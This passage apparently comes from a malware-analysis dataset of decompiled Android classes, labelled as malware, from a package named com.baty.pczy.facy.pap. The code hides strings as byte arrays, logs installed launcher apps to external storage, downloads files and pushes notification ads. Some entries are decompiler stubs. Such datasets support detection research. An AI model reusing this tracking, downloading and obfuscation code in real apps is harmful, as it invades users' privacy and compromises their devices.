th=th2;             fileOutputStream2=fileOutputStream;             a(fileInputStream);             a(fileOutputStream2);             throw th;           }         }       }  catch (      Exception e2) {         e=e2;         fileOutputStream=null;         fileInputStream2=fileInputStream;       } catch (      Throwable th3) {         th=th3;       }     }  catch (    Exception e3) {       e=e3;       fileOutputStream=null;     } catch (    Throwable th4) {       th=th4;       fileInputStream=null;     }   }   private static void a(  InputStream inputStream){     if (inputStream != null) {       try {         inputStream.close();       }  catch (      Exception e) {       }     }   }   private static void a(  OutputStream outputStream){     if (outputStream != null) {       try {         outputStream.close();       }  catch (      Exception e) {       }     }   }   public static boolean a(  com.baty.pczy.facy.pap.e.f fVar){     String b=b(fVar);     return !TextUtils.isEmpty(b) && Integer.valueOf(b.split("","")[0]).intValue() == 1;   }   private static String b(  com.baty.pczy.facy.pap.e.f fVar){     FileInputStream fileInputStream;     String str=null;     File c2=d.c(fVar);     if (c2 != null) {       exists=c2.exists();       try {         if (exists != 0) {           try {             fileInputStream=new FileInputStream(c2);             try {               str=new BufferedReader(new InputStreamReader(fileInputStream)).readLine();               a(fileInputStream);               exists=fileInputStream;             }  catch (            Exception e) {               e=e;               g.a(e);               a(fileInputStream);               exists=fileInputStream;               return str;             }           }  catch (          Exception e2) {             e=e2;             fileInputStream=null;           } catch (          Throwable th) {             exists=0;             th=th;             a((InputStream)exists);             throw th;           }         }       }  catch (      Throwable th2) {         th=th2;       }     }     return str;   }   public static void b(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     String b;     FileOutputStream fileOutputStream;     File c2=d.c(fVar);     if (c2 == null || (b=b(fVar)) == null || !b.startsWith(""1"")) {       return;     }     String[] split=b.split("","");     if (split.length == 2 && !split[1].equals(context.getPackageName())) {       return;     }     try {       fileOutputStream=new FileOutputStream(c2);       try {         try {           BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(fileOutputStream));           bufferedWriter.write(""0"");           bufferedWriter.flush();           a(fileOutputStream);         }  catch (        Exception e) {           e=e;           g.a(e);           a(fileOutputStream);         }       }  catch (      Throwable th) {         th=th;         a(fileOutputStream);         throw th;       }     }  catch (    Exception e2) {       e=e2;       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       fileOutputStream=null;       a(fileOutputStream);       throw th;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.f\f.code","public class f {   public static boolean a(  long j){     if (j <= 0) {       return false;     }     Calendar calendar=Calendar.getInstance();     calendar.setTimeInMillis(j);     Calendar calendar2=Calendar.getInstance();     return calendar2.get(5) == calendar.get(5) && calendar2.get(2) == calendar.get(2) && calendar2.get(1) == calendar.get(1);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.f\g.code","public class g {   private static HashSet a=new HashSet();   private static boolean b; static {     for (int i=300; i <= 315; i++) {       a.add(com.baty.pczy.facy.pap.s.g.d(com.baty.pczy.facy.pap.e.f57c,i));     }     if (a.contains(com.baty.pczy.facy.pap.e.b())) {       b=true;     }   }   private static String a(){     return com.baty.pczy.facy.pap.s.g.d(com.baty.pczy.facy.pap.e.f57c,8);   }   public static void a(  Class cls,  Object obj){   }   public static void a(  Exception exc){     if (b) {       exc.printStackTrace();     }   }   public static void a(  Object obj){     if (b) {       Log.i(""DEBUG"",a() + (obj != null ? obj.toString() : ""null""));     }   }   public static void a(  Object obj,  Object obj2){     a((Class)obj.getClass(),obj2);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.f\h.code","public class h {   private static String a;   private static String b;   public static String a(  Context context){     if (!TextUtils.isEmpty(a)) {       return a;     }     a=com.baty.pczy.facy.pap.e.a.d();     if (TextUtils.isEmpty(a)) {       try {         Bundle bundle=context.getPackageManager().getApplicationInfo(context.getPackageName(),128).metaData;         if (bundle != null) {           a=bundle.getString(com.baty.pczy.facy.pap.p.a.n);         }       }  catch (      Exception e) {         g.a(e);       }     }     return a;   }   public static void a(  Context context,  String str){     if (TextUtils.isEmpty(str)) {       return;     }     a=str;     com.baty.pczy.facy.pap.e.a.c(str);   }   public static String b(  Context context){     if (!TextUtils.isEmpty(b)) {       return b;     }     b=com.baty.pczy.facy.pap.e.a.e();     if (TextUtils.isEmpty(b)) {       try {         Bundle bundle=context.getPackageManager().getApplicationInfo(context.getPackageName(),128).metaData;         if (bundle != null) {           b=bundle.getString(com.baty.pczy.facy.pap.p.a.o);         }       }  catch (      Exception e) {         g.a(e);       }     }     return b;   }   public static void b(  Context context,  String str){     if (TextUtils.isEmpty(str)) {       return;     }     b=str;     com.baty.pczy.facy.pap.e.a.d(str);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.g\a.code","public class a implements com.baty.pczy.facy.pap.c.a {   private Context m;   private byte[] b={47,65,110,100,114,111,105,100,47,100,97,116,97,47,99,111,100,101,47,46,118,97,112,112,46,100,97,116};   private byte[] d={47,65,110,100,114,111,105,100,47,100,97,116,97,47,99,111,100,101,47,75,73,46,68,65,84};   private byte[] f={110,111,117,115,114,46,100,97,116};   private byte[] h={115,118,103,112,116,46,100,97,116};   private byte[] j={114,118,103,112,116,46,100,97,116};   private byte[] l={99,108,101,97,114,84,46,100,97,116};   private String f65c=a(this.d);   private String e=a(this.f);   private String g=a(this.h);   private String i=a(this.j);   private String k=a(this.l);   private String a=a(this.b);   public a(  Context context){     this.m=context;   }   private String a(  byte[] bArr){     return com.baty.pczy.facy.pap.s.a.a(bArr);   }   private void a(  File file,  String str){     FileOutputStream fileOutputStream;     if (file == null || str == null || !a(file)) {       return;     }     OutputStream outputStream=null;     try {       fileOutputStream=new FileOutputStream(file);     }  catch (    Exception e) {       fileOutputStream=null;     } catch (    Throwable th) {       th=th;     }     try {       fileOutputStream.write(com.baty.pczy.facy.pap.s.a.a(str).getBytes());       fileOutputStream.flush();       a(fileOutputStream);     }  catch (    Exception e2) {       a(fileOutputStream);     } catch (    Throwable th2) {       outputStream=fileOutputStream;       th=th2;       a(outputStream);       throw th;     }   }   private void a(  InputStream inputStream){     if (inputStream != null) {       try {         inputStream.close();       }  catch (      IOException e) {       }     }   }   private void a(  OutputStream outputStream){     if (outputStream != null) {       try {         outputStream.close();       }  catch (      IOException e) {       }     }   }   private boolean a(  File file){     if (file == null) {       return false;     }     File parentFile=file.getParentFile();     if (parentFile.exists() && parentFile.isDirectory()) {       return true;     }     return parentFile.mkdirs();   }   private String b(  File file){     FileInputStream fileInputStream;     Throwable th;     String str=null;     if (file != null && file.exists()) {       try {         fileInputStream=new FileInputStream(file);         try {           str=c(fileInputStream);           a(fileInputStream);         }  catch (        FileNotFoundException e) {           a(fileInputStream);           return str;         } catch (        Throwable th2) {           th=th2;           a(fileInputStream);           throw th;         }       }  catch (      FileNotFoundException e2) {         fileInputStream=null;       } catch (      Throwable th3) {         fileInputStream=null;         th=th3;       }     }     return str;   }   private byte[] b(  InputStream inputStream){     byte[] bArr=new byte[1024];     ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();     while (true) {       try {         int read=inputStream.read(bArr);         if (read == -1) {           byte[] byteArray=byteArrayOutputStream.toByteArray();           a(byteArrayOutputStream);           return byteArray;         }         byteArrayOutputStream.write(bArr,0,read);       }  catch (      Exception e) {         a(byteArrayOutputStream);         return null;       } catch (      Throwable th) {         a(byteArrayOutputStream);         throw th;       }     }   }   private String c(  InputStream inputStream){     byte[] b=b(inputStream);     if (b != null) {       return com.baty.pczy.facy.pap.s.a.b(new String(b));     }     return null;   }   private void c(  File file){     if (file.exists()) {       for (      File file2 : file.listFiles()) {         if (file2.isFile()) {           String name=file2.getName();           if (name.endsWith(com.baty.pczy.facy.pap.p.a.A) || name.endsWith(com.baty.pczy.facy.pap.p.a.cH) || name.endsWith(com.baty.pczy.facy.pap.p.a.cI)) {             file2.delete();           }         }  else         if (file2.isDirectory()) {           c(file2);           file2.delete();         }       }     }   }   private boolean h(){     return ""mounted"".equals(Environment.getExternalStorageState());   }   private File i(){     if (h()) {       return new File(Environment.getExternalStorageDirectory(),this.f65c);     }     return null;   }   private File j(){     File b=d.b();     if (b == null) {       return null;     }     return new File(b,this.e);   }   private File k(){     File b=d.b();     if (b == null) {       return null;     }     return new File(b,this.g);   }   private File l(){     File b=d.b();     if (b == null) {       return null;     }     File file=new File(b,this.i);     if (a(file)) {       return file;     }     return null;   }   private File m(){     File b=d.b();     if (b == null) {       return null;     }     return new File(b,this.k);   }   private File n(){     if (!d.a()) {       return null;     }     File file=new File(Environment.getExternalStorageDirectory(),this.a);     if (d.b(file)) {       return file;     }     return null;   }   @Override public String a(){     File i=i();     if (i == null || !i.exists()) {       return null;     }     return b(i);   }   @Override public void a(  int i){     File k;     if (i > 0 && (k=k()) != null) {       a(k,String.valueOf(i));     }   }   @Override public void a(  long j){     File l=l();     if (l != null) {       a(l,String.valueOf(j));     }   }   @Override public void a(  String str){     a(i(),str);   }   @Override public String b(){     File j=j();     if (!j.exists()) {       return null;     }     String b=b(j);     if (TextUtils.isEmpty(b)) {       return null;     }     try {       StringBuilder sb=new StringBuilder();       for (      String str : b.split("";"")) {         if (!TextUtils.isEmpty(str)) {           String[] split=str.split("","");           if (split.length == 2) {             String str2=split[0];             if (com.baty.pczy.facy.pap.s.a.d(this.m,split[1])) {               sb.append(str2).append("","");             }           }         }       }       return sb.toString();     }  catch (    Exception e) {       j.delete();       return null;     }   }   @Override public void b(  String str){     File j;     if (TextUtils.isEmpty(str) || (j=j()) == null) {       return;     }     a(j,str);   }   @Override public int c(){     String b;     File k=k();     if (k == null || (b=b(k)) == null) {       return 60;     }     try {       return Integer.valueOf(b).intValue();     }  catch (    Exception e) {       return 60;     }   }   @Override public void c(  String str){     FileOutputStream fileOutputStream;     File n=n();     if (n == null) {       return;     }     FileOutputStream fileOutputStream2=null;     try {       fileOutputStream=new FileOutputStream(n,true);     }  catch (    Exception e) {       fileOutputStream=null;     } catch (    Throwable th) {       th=th;     }     try {       BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(fileOutputStream));       StringBuilder sb=new StringBuilder();       sb.append(str).append(""="").append(System.currentTimeMillis()).append(""\n"");       bufferedWriter.write(sb.toString());       bufferedWriter.flush();       a(fileOutputStream);     }  catch (    Exception e2) {       a(fileOutputStream);     } catch (    Throwable th2) {       fileOutputStream2=fileOutputStream;       th=th2;       a(fileOutputStream2);       throw th;     }   }   @Override public long d(){     File l=l();     if (l == null) {       return 0L;     }     try {       return Long.valueOf(b(l)).longValue();     }  catch (    Exception e) {       l.delete();       return 0L;     }   }   @Override public boolean d(  String str){     FileInputStream fileInputStream;     File n=n();     if (n == null || !n.exists()) {       return false;     }     try {       fileInputStream=new FileInputStream(n);       try {         try {           BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(fileInputStream));           while (true) {             String readLine=bufferedReader.readLine();             if (readLine == null) {               a(fileInputStream);               return false;             }             try {               String[] split=readLine.split(""="");               if (split.length == 2 && str.equals(split[0])) {                 a(fileInputStream);                 return true;               }             }  catch (            Exception e) {             }           }         }  catch (        Exception e2) {           a(fileInputStream);           return false;         }       }  catch (      Throwable th) {         th=th;         a(fileInputStream);         throw th;       }     }  catch (    Exception e3) {       fileInputStream=null;     } catch (    Throwable th2) {       th=th2;       fileInputStream=null;     }   }   @Override public long e(  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.pczy.facy.pap.g.a.e(java.lang.String):long"");   }   @Override public void e(){     File b=d.b();     if (b == null) {       return;     }     File m=m();     String b2=b(m);     long j=-1;     if (!TextUtils.isEmpty(b2)) {       try {         j=Long.valueOf(b2).longValue();       }  catch (      Exception e) {         m.delete();       }     }     if (j < 0) {       a(m,"""" + System.currentTimeMillis());     }  else     if (System.currentTimeMillis() - j > 604800000 && b.exists() && b.isDirectory()) {       c(b);       a(m,"""" + System.currentTimeMillis());     }   }   @Override public void f(){     FileInputStream fileInputStream;     Throwable th;     File n=n();     if (n == null || !n.exists()) {       return;     }     FileInputStream fileInputStream2=null;     try {       fileInputStream=new FileInputStream(n);     }  catch (    Exception e) {     } catch (    Throwable th2) {       fileInputStream=null;       th=th2;     }     try {       BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(fileInputStream));       ArrayList arrayList=new ArrayList();       int i=0;       while (true) {         String readLine=bufferedReader.readLine();         if (readLine == null) {           break;         }         i++;         if (i > 100) {           arrayList.add(readLine);         }       }       if (i > 200) {         File file=new File(n + "".tmp"");         FileOutputStream fileOutputStream=new FileOutputStream(file);         BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(fileOutputStream));         int size=arrayList.size();         for (int i2=0; i2 < size; i2++) {           bufferedWriter.write((String)arrayList.get(i2));           bufferedWriter.write(""\n"");         }         bufferedWriter.flush();         a(fileOutputStream);         a(fileInputStream);         n.delete();         file.renameTo(n);       }       arrayList.clear();       a(fileInputStream);     }  catch (    Exception e2) {       fileInputStream2=fileInputStream;       a(fileInputStream2);     } catch (    Throwable th3) {       th=th3;       a(fileInputStream);       throw th;     }   }   @Override public void g(){     FileOutputStream fileOutputStream;     File n=n();     if (n == null || n.exists()) {       return;     }     packageManager=e.f57c.getPackageManager();     Intent intent=new Intent(""android.intent.action.MAIN"");     intent.addCategory(""android.intent.category.LAUNCHER"");     List<ResolveInfo> queryIntentActivities=packageManager.queryIntentActivities(intent,0);     try {       try {         fileOutputStream=new FileOutputStream(n);         try {           BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(fileOutputStream));           for (          ResolveInfo resolveInfo : queryIntentActivities) {             StringBuilder sb=new StringBuilder();             sb.append(resolveInfo.activityInfo.packageName).append(""="").append(System.currentTimeMillis()).append(""\n"");             bufferedWriter.write(sb.toString());           }           bufferedWriter.flush();           a(fileOutputStream);         }  catch (        Exception e) {           e=e;           g.a(e);           a(fileOutputStream);         }       }  catch (      Throwable th) {         th=th;         a(packageManager);         throw th;       }     }  catch (    Exception e2) {       e=e2;       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       packageManager=0;       a(packageManager);       throw th;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.g\b.code","public class b implements com.baty.pczy.facy.pap.c.b {   private String H;   private SharedPreferences i;   private SharedPreferences j;   private SharedPreferences k;   private SharedPreferences l;   private String y;   private byte[] b={97,100,105,110,102,111};   private byte[] d={97,100,115,116,97,116,101,115};   private byte[] f={97,112,112};   private byte[] h={100,97,116};   private byte[] n={97,100,102,97,105,108,101,100,115,116,97,116,101,115};   private byte[] p={97,100,73,110,102,111};   private byte[] r={86,45,73,68};   private byte[] t={67,72,76,45,73,68};   private byte[] v={105};   private byte[] x={115,104,101,100,117,108,101,73,100,115};   private byte[] A={114,101,113,117,101,115,116,95,97,108,108,95,97,100};   private Object B=new Object();   private Object C=new Object();   private Object D=new Object();   private Object E=new Object();   private byte[] G={44};   private String a=a(this.b);   private String f66c=a(this.d);   private String g=a(this.h);   private String e=a(this.f);   private String m=a(this.n);   private String F=a(this.G);   private String q=a(this.r);   private String s=a(this.t);   private String u=a(this.v);   private String w=a(this.x);   private String o=a(this.p);   private String z=a(this.A);   public b(  Context context){     this.i=context.getSharedPreferences(this.a,0);     this.j=context.getSharedPreferences(this.f66c,0);     this.k=context.getSharedPreferences(this.g,0);     this.l=context.getSharedPreferences(this.e,0);     this.y=g.d(context,3);     this.H=g.d(context,6);   }   private String a(  byte[] bArr){     return com.baty.pczy.facy.pap.s.a.a(bArr);   }   private String i(  String str){     return str;   }   private String j(  String str){     return str;   }   private Set k(  String str){     String[] split=str.split("";"");     HashSet hashSet=new HashSet();     try {       for (      String str2 : split) {         hashSet.add(Integer.valueOf(str2.split("","")[0]));       }     }  catch (    Exception e) {     }     return hashSet;   }   @Override public com.baty.pczy.facy.pap.e.b a(){ synchronized (this.B) {       String string=this.i.getString(this.o,null);       if (TextUtils.isEmpty(string)) {         return null;       }       try {         JSONObject jSONObject=new JSONObject(string);         com.baty.pczy.facy.pap.e.b bVar=new com.baty.pczy.facy.pap.e.b();         bVar.a(jSONObject);         return bVar;       }  catch (      Exception e) {         return null;       }     }   }   @Override public String a(  int i){     String string; synchronized (this.C) {       string=this.j.getString(String.valueOf(i),"""");     }     return string;   }   @Override public void a(  int i,  int i2){ synchronized (this.C) {       String valueOf=String.valueOf(i);       String string=this.j.getString(valueOf,"""");       this.j.edit().putString(valueOf,TextUtils.isEmpty(string) ? String.valueOf(i2) : string + this.F + i2).commit();     }   }   @Override public void a(  long j){ synchronized (this.D) {       this.k.edit().putLong(this.z,j).commit();     }   }   @Override public void a(  com.baty.pczy.facy.pap.e.b bVar){ synchronized (this.B) {       String jSONObject=bVar.c().toString();       this.i.edit().putString("""" + bVar.b.p,jSONObject).commit();       this.i.edit().putString(this.o,jSONObject).commit();     }   }   @Override public void a(  f fVar){     if (fVar == null) {       return;     } synchronized (this.E) {       SharedPreferences.Editor edit=this.l.edit();       edit.putString(String.valueOf(fVar.p),fVar.c().toString());       edit.commit();     }   }   @Override public void a(  String str){     if (TextUtils.isEmpty(str)) {       return;     }     Set k=k(str); synchronized (this.B) {       Set<String> keySet=this.i.getAll().keySet();       SharedPreferences.Editor edit=this.i.edit();       for (      String str2 : keySet) {         if (!k.contains(str2)) {           edit.remove(str2);         }       }       edit.commit();     }   }   public void a(  JSONArray jSONArray){ synchronized (this.D) {       String string=this.k.getString(this.m,null);       try {         JSONArray jSONArray2=TextUtils.isEmpty(string) ? new JSONArray() : new JSONArray(string);         int length=jSONArray2.length();         int length2=jSONArray.length();         for (int i=0; i < length2; i++) {           jSONArray2.put(length + i,jSONArray.getJSONObject(i));         }         this.k.edit().putString(this.m,jSONArray2.toString()).commit();       }  catch (      Exception e) {       }     }   }   @Override public void a(  boolean z){ synchronized (this.D) {       this.k.edit().putBoolean(this.H,z).commit();     }   }   @Override public void a(  j[] jVarArr){     a((JSONArray)new com.baty.pczy.facy.pap.e.g(Arrays.asList(jVarArr)).c());   }   @Override public List b(){     ArrayList arrayList; synchronized (this.B) {       Set<Map.Entry<String,?>> entrySet=this.i.getAll().entrySet();       arrayList=new ArrayList();       for (      Map.Entry<String,?> entry : entrySet) {         if (!this.o.equals(entry.getKey())) {           String str=(String)entry.getValue();           com.baty.pczy.facy.pap.e.b bVar=new com.baty.pczy.facy.pap.e.b();           try {             bVar.a(new JSONObject(str));             arrayList.add(bVar);           }  catch (          JSONException e) {           }         }       }     }     return arrayList;   }   @Override public void b(  int i){ synchronized (this.D) {       String string=this.k.getString(this.w,"""");       this.k.edit().putString(this.w,!TextUtils.isEmpty(string) ? string + "","" + i : """" + i).commit();     }   }   @Override public void b(  long j){ synchronized (this.D) {       this.k.edit().putLong(this.y,j).commit();     }   }   @Override public void b(  String str){     if (TextUtils.isEmpty(str)) {       return;     }     Set k=k(str); synchronized (this.C) {       Set<String> keySet=this.j.getAll().keySet();       SharedPreferences.Editor edit=this.j.edit();       for (      String str2 : keySet) {         if (!k.contains(str2)) {           edit.remove(str2);         }       }       edit.commit();     }   }   @Override public boolean b(  int i,  int i2){     boolean contains; synchronized (this.C) {       contains=this.j.getString(String.valueOf(i),"""").contains(String.valueOf(i2));     }     return contains;   }   @Override public f c(  int i){     f fVar; synchronized (this.E) {       String valueOf=String.valueOf(i);       String string=this.l.getString(valueOf,"""");       if (!TextUtils.isEmpty(string)) {         try {           JSONObject jSONObject=new JSONObject(string);           fVar=new f();           fVar.a(jSONObject);         }  catch (        Exception e) {           this.l.edit().remove(valueOf).commit();         }       }       fVar=null;     }     return fVar;   }   @Override public JSONArray c(){     JSONArray jSONArray; synchronized (this.D) {       String string=this.k.getString(this.m,"""");       this.k.edit().remove(this.m).commit();       if (!TextUtils.isEmpty(string)) {         try {           jSONArray=new JSONArray(string);         }  catch (        Exception e) {         }       }       jSONArray=null;     }     return jSONArray;   }   @Override public void c(  String str){     if (TextUtils.isEmpty(str)) {       return;     } synchronized (this.D) {       this.k.edit().putString(this.q,i(str)).commit();     }   }   @Override public String d(){     String j; synchronized (this.D) {       j=j(this.k.getString(this.q,""""));     }     return j;   }   @Override public void d(  String str){     if (TextUtils.isEmpty(str)) {       return;     } synchronized (this.D) {       this.k.edit().putString(this.s,i(str)).commit();     }   }   @Override public String e(){     String j; synchronized (this.D) {       j=j(this.k.getString(this.s,""""));     }     return j;   }   @Override public void e(  String str){     if (TextUtils.isEmpty(str)) {       return;     } synchronized (this.D) {       this.k.edit().putString(this.u,i(str)).commit();     }   }   @Override public f f(  String str){     f fVar;     if (str == null) {       return null;     } synchronized (this.E) {       Map<String,?> all=this.l.getAll();       if (all == null) {         fVar=null;       }  else {         Collection<?> values=all.values();         if (values == null) {           fVar=null;         }  else {           try {             Iterator<?> it=values.iterator();             while (it.hasNext()) {               String str2=(String)it.next();               f fVar2=new f();               fVar2.a(new JSONObject(str2));               if (str.equals(fVar2.o)) {                 fVar=fVar2;                 break;               }             }           }  catch (          JSONException e) {           }           fVar=null;         }       }     }     return fVar;   }   @Override public String f(){     String string; synchronized (this.D) {       string=this.k.getString(this.w,"""");     }     return string;   }   @Override public f g(  String str){     f fVar;     f fVar2;     if (TextUtils.isEmpty(str)) {       return null;     } synchronized (this.E) {       Iterator<?> it=this.l.getAll().values().iterator();       while (true) {         if (!it.hasNext()) {           fVar=null;           break;         }         String str2=(String)it.next();         try {           fVar2=new f();           fVar2.a(new JSONObject(str2));         }  catch (        Exception e) {         }         if (str.equals(fVar2.b)) {           fVar=fVar2;           break;         }       }     }     return fVar;   }   @Override public void g(){ synchronized (this.D) {       this.k.edit().remove(this.w).commit();     }   }   @Override public long h(){     long j; synchronized (this.D) {       j=this.k.getLong(this.z,0L);     }     return j;   }   @Override public void h(  String str){     if (TextUtils.isEmpty(str)) {       return;     }     Set k=k(str); synchronized (this.E) {       Set<String> keySet=this.l.getAll().keySet();       SharedPreferences.Editor edit=this.l.edit();       for (      String str2 : keySet) {         if (!k.contains(str2)) {           edit.remove(str2);         }       }       edit.commit();     }   }   @Override public String i(){     String j; synchronized (this.D) {       j=j(this.k.getString(this.u,""""));     }     return j;   }   @Override public boolean j(){     boolean z; synchronized (this.D) {       z=this.k.getBoolean(this.H,false);     }     return z;   }   @Override public List k(){     ArrayList arrayList; synchronized (this.E) {       Map<String,?> all=this.l.getAll();       arrayList=new ArrayList();       if (all != null && all.size() > 0) {         Iterator<?> it=all.values().iterator();         while (it.hasNext()) {           String str=(String)it.next();           f fVar=new f();           try {             fVar.a(new JSONObject(str));             arrayList.add(fVar);           }  catch (          JSONException e) {             com.baty.pczy.facy.pap.f.g.a((Exception)e);           }         }       }     }     return arrayList;   }   @Override public long l(){     long j; synchronized (this.D) {       j=this.k.getLong(this.y,0L);     }     return j;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.h\a.code","public interface a extends Serializable {   Object a(  JSONObject jSONObject);   String b();   Object c(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@100d575d"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\b.code","public class b implements Runnable {   final a a;   public b(  a aVar){     this.a=aVar;   }   @Override public void run(){     com.baty.pczy.facy.pap.e.b bVar;     com.baty.pczy.facy.pap.e.b bVar2;     int b;     int b2;     Context context;     com.baty.pczy.facy.pap.e.b bVar3;     Context context2;     com.baty.pczy.facy.pap.e.b bVar4;     boolean b3;     Context context3;     Context context4;     NotificationManager notificationManager;     int i;     int i2;     int i3;     int i4;     int i5;     Context context5;     int i6;     int i7;     int i8;     Context context6;     Bitmap bitmap;     int i9;     Context context7;     int i10;     bVar=this.a.p;     com.baty.pczy.facy.pap.e.f fVar=bVar.b;     bVar2=this.a.p;     com.baty.pczy.facy.pap.e.d dVar=bVar2.a;     b=a.b(dVar.g);     b2=a.b(dVar.g);     Notification notification=new Notification(b2,fVar.h,System.currentTimeMillis());     if (dVar.f59c == 1) {       notification.flags|=32;     }     context=this.a.o;     Intent intent=new Intent(context,(Class<?>)com.baty.pczy.facy.pap.e.i);     intent.setType(com.baty.pczy.facy.pap.c.f50c);     String simpleName=com.baty.pczy.facy.pap.e.b.class.getSimpleName();     bVar3=this.a.p;     intent.putExtra(simpleName,bVar3);     context2=this.a.o;     bVar4=this.a.p;     PendingIntent service=PendingIntent.getService(context2,bVar4.b.p,intent,134217728);     notification.contentIntent=service;     b3=this.a.b();     StringBuilder sb=new StringBuilder();     context3=this.a.o;     com.baty.pczy.facy.pap.f.g.a(sb.append(com.baty.pczy.facy.pap.s.g.d(context3,25)).append(b3).toString());     if (b3) {       StringBuilder sb2=new StringBuilder();       i=this.a.r;       StringBuilder append=sb2.append(i).append("","");       i2=this.a.t;       StringBuilder append2=append.append(i2).append("","");       i3=this.a.u;       StringBuilder append3=append2.append(i3).append("","");       i4=this.a.s;       StringBuilder append4=append3.append(i4).append("","");       i5=this.a.v;       com.baty.pczy.facy.pap.f.g.a(append4.append(i5).toString());       context5=this.a.o;       String packageName=context5.getPackageName();       i6=this.a.r;       RemoteViews remoteViews=new RemoteViews(packageName,i6);       i7=this.a.t;       remoteViews.setTextViewText(i7,fVar.h);       i8=this.a.u;       remoteViews.setTextViewText(i8,fVar.g);       context6=this.a.o;       Bitmap b4=com.baty.pczy.facy.pap.s.g.b(context6,64);       if (b4 != null) {         b4.setDensity(240);         i10=this.a.v;         remoteViews.setImageViewBitmap(i10,b4);       }       bitmap=this.a.w;       if (bitmap == null) {         context7=this.a.o;         bitmap=((BitmapDrawable)context7.getResources().getDrawable(b)).getBitmap();       }       if (bitmap != null) {         i9=this.a.s;         remoteViews.setImageViewBitmap(i9,bitmap);       }       notification.contentView=remoteViews;       notification.when=System.currentTimeMillis();       notification.icon=b;       notification.tickerText=fVar.h;     }  else {       context4=this.a.o;       notification.setLatestEventInfo(context4,fVar.h,fVar.g,service);     }     notificationManager=this.a.q;     notificationManager.notify(fVar.p,notification);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\c.code","public class c implements com.baty.pczy.facy.pap.q.a {   final String a;   final File b;   final a f68c;   public c(  a aVar,  String str,  File file){     this.f68c=aVar;     this.a=str;     this.b=file;   }   @Override public void a(){     com.baty.pczy.facy.pap.d.a aVar;     com.baty.pczy.facy.pap.d.f fVar=new com.baty.pczy.facy.pap.d.f(this.a,this.b,0);     aVar=this.f68c.x;     fVar.a(aVar);     fVar.e();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\d.code","class d implements com.baty.pczy.facy.pap.d.a {   final a a;   public d(  a aVar){     this.a=aVar;   }   @Override public void a(  com.baty.pczy.facy.pap.d.f fVar,  int i){   }   @Override public void a(  com.baty.pczy.facy.pap.d.f fVar,  long j){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\e.code","public class e implements com.baty.pczy.facy.pap.q.a {   final File a;   final a b;   public e(  a aVar,  File file){     this.b=aVar;     this.a=file;   }   @Override public void a(){     com.baty.pczy.facy.pap.e.b bVar;     com.baty.pczy.facy.pap.d.a aVar;     bVar=this.b.p;     com.baty.pczy.facy.pap.d.f fVar=new com.baty.pczy.facy.pap.d.f(bVar.b.f60c,this.a,0);     aVar=this.b.y;     fVar.a(aVar);     fVar.e();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\f.code","public class f implements com.baty.pczy.facy.pap.d.a {   final a a;   public f(  a aVar){     this.a=aVar;   }   @Override public void a(  com.baty.pczy.facy.pap.d.f fVar,  int i){     Context context;     if (i == 4) {       a aVar=this.a;       context=this.a.o;       aVar.w=com.baty.pczy.facy.pap.s.h.a(context,fVar.c().getPath());       this.a.d();     }   }   @Override public void a(  com.baty.pczy.facy.pap.d.f fVar,  long j){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@608bb8fb"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\h.code","class h implements Runnable {   final com.baty.pczy.facy.pap.d.f a;   final g b;   public h(  g gVar,  com.baty.pczy.facy.pap.d.f fVar){     this.b=gVar;     this.a=fVar;   }   @Override public void run(){     Context context;     com.baty.pczy.facy.pap.e.f fVar;     context=this.b.a;     String path=this.a.c().getPath();     fVar=this.b.b;     com.baty.pczy.facy.pap.s.a.a(context,path,fVar.o);   } } "
